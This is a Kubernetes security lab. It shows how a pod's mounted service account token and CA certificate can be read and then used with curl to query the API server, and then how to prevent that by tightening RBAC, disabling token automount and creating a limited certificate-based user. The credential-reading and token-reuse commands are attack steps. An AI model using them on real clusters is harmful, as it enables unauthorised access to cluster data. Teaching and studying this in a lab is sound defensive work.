# Identity theft

In this lab you will steal the identity of a pod.

## Attack

### SSH into the VM

```bash
gcloud compute ssh root@kubernetes-security --zone europe-west3-a
```

### Getting the credentials

```bash
# verify the sensitive data in the pod
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Exploiting the API-Server

```bash
# store the token into an env variable
TOKEN=$(kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# store the CA into a file
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt

# get infos about pods
curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
```

## Avoiding the Attack

### Checking the permissions

```bash
# check permissions in the default namespace
kubectl auth can-i delete pods
kubectl auth can-i --list

# check the clusterrolebinding
kubectl describe clusterrolebinding my-suboptimal-clusterrolebinding

# check the permissions of the cluster role
kubectl describe clusterrole cluster-admin
```

### Disable permissions

```bash
# disable permissions
kubectl delete clusterrolebinding my-suboptimal-clusterrolebinding

# try to get infos about pods - now this should fail
curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
```

### Avoiding token mounts

Disable automount of ServiceAccount Token in the file `pod.yaml`

```yaml
spec:
  automountServiceAccountToken: false # <= disable automount of ServiceAccount Token
```

```bash
kubectl apply -f pod.yaml --force
```

#### Verify sensible data is not mounted anymore

```bash
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

#### ServiceAccountToken

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-service-account
automountServiceAccountToken: false
```

## User Management

````bash

```bash
openssl genrsa -out john.key 2048
openssl req -new -key john.key -out john.csr # common name is important
cat john.csr | base64 -w 0
````

```yaml
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: john
spec:
  request: ...
  signerName: kubernetes.io/kube-apiserver-client
  expirationSeconds: 86400 # one day
  usages:
    - client auth
```

```bash
# create csr.yaml
kubectl create -f csr.yaml
kubectl get csr

# approve csr
kubectl certificate approve john

# create role and assign role to user
kubectl create role john --resource pods --verb list,get
kubectl create rolebinding john --role john --user john

# verify
kubectl auth can-i list pods --as john
kubectl auth can-i delete pods --as john
kubectl -n kube-system auth can-i list pods --as john
```
